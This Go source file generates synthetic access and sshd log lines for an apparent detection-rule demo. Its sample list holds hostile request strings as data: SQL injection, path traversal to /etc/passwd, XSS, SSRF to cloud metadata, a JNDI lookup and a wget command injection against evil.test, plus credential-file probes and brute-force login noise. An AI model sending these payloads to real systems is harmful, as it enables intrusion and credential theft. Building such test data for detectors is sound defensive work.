package demo

import (
	"context"
	"fmt"
	"math/rand"
	"time"
)

type sample struct {
	ip, method, url, ua string
	status              int
	clean               bool
}

var attackers = []string{
	"185.220.101.47",
	"45.155.205.88",
	"193.35.18.91",
	"91.219.236.177",
	"167.94.138.44",
	"103.107.196.10",
	"41.76.108.22",
	"200.89.75.14",
	"36.99.140.8",
	"122.162.55.9",
	"51.15.123.10",
	"177.54.148.22",
	"61.19.44.90",
	"118.70.12.8",
	"91.132.144.6",
	"185.156.73.54",
	"194.26.29.18",
	"141.98.10.62",
	"89.248.165.9",
	"5.188.206.44",
}

var locals = []string{
	"203.0.113.20",
	"198.51.100.14",
	"10.0.4.22",
}

var attacks = []sample{
	{method: "GET", url: "/api/users?id=1%20UNION%20SELECT%20password%20FROM%20users", status: 200, ua: "Mozilla/5.0"},
	{method: "GET", url: "/search?q=1'%20OR%20'1'%3D'1", status: 200, ua: "Mozilla/5.0"},
	{method: "GET", url: "/item?id=1%3B%20DROP%20TABLE%20orders--", status: 500, ua: "sqlmap/1.8.2#stable"},
	{method: "GET", url: "/static/../../etc/passwd", status: 403, ua: "Mozilla/5.0"},
	{method: "GET", url: "/download?file=..%2f..%2f..%2fwindows/win.ini", status: 404, ua: "Mozilla/5.0"},
	{method: "GET", url: "/.env", status: 404, ua: "nuclei/3.3"},
	{method: "GET", url: "/.git/config", status: 404, ua: "nuclei/3.3"},
	{method: "GET", url: "/wp-admin/setup-config.php", status: 404, ua: "wpscan/3"},
	{method: "GET", url: "/phpmyadmin/", status: 404, ua: "Nikto/2.5"},
	{method: "GET", url: "/?q=%3Cscript%3Ealert(1)%3C/script%3E", status: 200, ua: "Mozilla/5.0"},
	{method: "GET", url: "/page?name={{7*7}}", status: 200, ua: "Mozilla/5.0"},
	{method: "GET", url: "/fetch?url=http://169.254.169.254/latest/meta-data/", status: 502, ua: "python-requests/2.32"},
	{method: "GET", url: "/x?q=%24%7Bjndi%3Aldap%3A//evil.test/a%7D", status: 400, ua: "${jndi:ldap://x/}"},
	{method: "GET", url: "/cmd?exec=wget%20http://evil.test/s.sh", status: 403, ua: "Mozilla/5.0"},
	{method: "GET", url: "/index.php?file=php://filter/convert.base64-encode/resource=index.php", status: 200, ua: "Mozilla/5.0"},
	{method: "GET", url: "/server-status", status: 403, ua: "Mozilla/5.0"},
	{method: "TRACE", url: "/", status: 405, ua: "Mozilla/5.0"},
	{method: "POST", url: "/api/auth/login", status: 401, ua: "Mozilla/5.0"},
	{method: "GET", url: "/admin", status: 403, ua: "Mozilla/5.0"},
}

var clean = []sample{
	{method: "GET", url: "/", status: 200, ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", clean: true},
	{method: "GET", url: "/menu", status: 200, ua: "Mozilla/5.0", clean: true},
	{method: "GET", url: "/assets/app.css", status: 200, ua: "Mozilla/5.0", clean: true},
	{method: "POST", url: "/api/orders", status: 201, ua: "Mozilla/5.0", clean: true},
	{method: "GET", url: "/catalog?day=2026-08-14", status: 200, ua: "Mozilla/5.0", clean: true},
	{method: "GET", url: "/healthz", status: 200, ua: "Mozilla/5.0", clean: true},
	{method: "GET", url: "/favicon.ico", status: 200, ua: "Mozilla/5.0", clean: true},
}

// Run writes combined-format lines forever until ctx is done.
func Run(ctx context.Context, every time.Duration, emit func(line string)) {
	if every <= 0 {
		every = time.Second
	}
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	// Burst a 404 storm from one IP so the threshold rule fires early.
	go bust(ctx, emit)
	// Slow human-paced walk so snoop / canary rules fire.
	go humanSnoop(ctx, emit)
	go authNoise(ctx, emit)

	t := time.NewTicker(every)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			var s sample
			var ip string
			if rng.Intn(5) == 0 {
				s = clean[rng.Intn(len(clean))]
				ip = locals[rng.Intn(len(locals))]
			} else {
				s = attacks[rng.Intn(len(attacks))]
				ip = attackers[rng.Intn(len(attackers))]
			}
			emit(format(ip, s))
		}
	}
}

func bust(ctx context.Context, emit func(line string)) {
	ip := "45.83.12.9"
	for i := 0; i < 30 && ctx.Err() == nil; i++ {
		s := sample{method: "GET", url: fmt.Sprintf("/not-a-page-%d", i), status: 404, ua: "ffuf/2.1"}
		emit(format(ip, s))
		time.Sleep(40 * time.Millisecond)
	}
	// login brute
	for i := 0; i < 10 && ctx.Err() == nil; i++ {
		s := sample{method: "POST", url: "/api/auth/login", status: 401, ua: "Mozilla/5.0"}
		emit(format("91.219.236.177", s))
		time.Sleep(80 * time.Millisecond)
	}
}

func humanSnoop(ctx context.Context, emit func(line string)) {
	ip := "193.142.59.17"
	walk := []sample{
		{method: "GET", url: "/admin", status: 404, ua: "Mozilla/5.0"},
		{method: "GET", url: "/admin/login", status: 404, ua: "Mozilla/5.0"},
		{method: "GET", url: "/.env", status: 404, ua: "Mozilla/5.0"},
		{method: "GET", url: "/.env.local", status: 404, ua: "Mozilla/5.0"},
		{method: "GET", url: "/.aws/credentials", status: 404, ua: "Mozilla/5.0"},
		{method: "GET", url: "/swagger.json", status: 404, ua: "Mozilla/5.0"},
		{method: "GET", url: "/backup.zip", status: 403, ua: "Mozilla/5.0"},
		{method: "GET", url: "/super-admin-backup-2026/", status: 404, ua: "Mozilla/5.0"},
		{method: "GET", url: "/internal-sync/v1", status: 404, ua: "Mozilla/5.0"},
		{method: "GET", url: "/app?debug=true", status: 200, ua: "Mozilla/5.0"},
	}
	time.Sleep(800 * time.Millisecond)
	for _, s := range walk {
		if ctx.Err() != nil {
			return
		}
		emit(format(ip, s))
		time.Sleep(2200 * time.Millisecond)
	}
}

func authNoise(ctx context.Context, emit func(line string)) {
	users := []string{"root", "admin", "deploy", "ubuntu", "alice"}
	ips := []string{"185.220.101.47", "91.219.236.177", "45.83.12.9", "193.35.18.91"}
	t := time.NewTicker(1800 * time.Millisecond)
	defer t.Stop()
	i := 0
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			i++
			ip := ips[i%len(ips)]
			user := users[i%len(users)]
			if i%5 == 0 {
				kind := "applogin"
				path := "/api/login"
				if i%10 == 0 {
					kind = "tenantlogin"
					path = "/owner/login"
				}
				emit(fmt.Sprintf(`{"kind":"%s","src_ip":"%s","user":"%s","path":"%s","status":401,"outcome":"fail","method":"LOGIN","ua":"Mozilla/5.0"}`,
					kind, ip, user, path))
				continue
			}
			stamp := time.Now().UTC().Format("Jan 2 15:04:05")
			if i%7 == 0 {
				emit(fmt.Sprintf("%s box sshd[11]: Accepted publickey for deploy from %s port 22 ssh2", stamp, ips[0]))
				continue
			}
			emit(fmt.Sprintf("%s box sshd[11]: Failed password for %s from %s port 22 ssh2", stamp, user, ip))
		}
	}
}

func format(ip string, s sample) string {
	ts := time.Now().UTC().Format("02/Jan/2006:15:04:05 -0700")
	return fmt.Sprintf(`%s - - [%s] "%s %s HTTP/1.1" %d %d "-" "%s"`,
		ip, ts, s.method, s.url, s.status, 200+len(s.url), s.ua)
}
